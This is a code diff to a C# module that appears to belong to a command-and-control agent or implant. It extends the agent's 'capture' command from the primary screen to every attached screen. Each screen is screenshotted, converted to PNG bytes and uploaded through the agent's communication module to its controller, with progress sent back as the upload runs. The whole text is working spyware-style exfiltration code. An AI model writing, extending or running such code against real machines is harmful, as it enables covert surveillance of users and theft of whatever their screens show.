@@ -17,24 +17,30 @@ namespace Commands
         public override string Name => "capture";
         public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
-            Rectangle rc = Screen.PrimaryScreen.Bounds;
-            var image = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
-            using(Graphics memGraph = Graphics.FromImage(image))
+            int screenId = 1;
+            foreach (var screen in Screen.AllScreens)
             {
-                memGraph.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
+                Rectangle rc = screen.Bounds;
+                var image = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+                using (Graphics memGraph = Graphics.FromImage(image))
+                {
+                    memGraph.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
+                }
+
+                ImageConverter converter = new ImageConverter();
+                var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));
+
+                var filename = $"capture/{Guid.NewGuid()}.png";
+                commm.Upload(buff, filename, a =>
+                {
+                    result.Info = $"Downloading {filename} ({a}%)";
+                    commm.SendResult(result);
+                }).Wait();
+
+                result.Result += $"Screen #{screenId} Captured to {filename}!"+ Environment.NewLine;
+
+                screenId++;
             }
-
-            ImageConverter converter = new ImageConverter();
-            var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));
-
-            var filename = $"capture/{Guid.NewGuid()}.png";
-            commm.Upload(buff, filename, a =>
-            {
-                result.Info = $"Downloading {filename} ({a}%)";
-                commm.SendResult(result);
-            }).Wait();
-
-            result.Result = $"Screen Captured to {filename}!";
         }
     }
 }
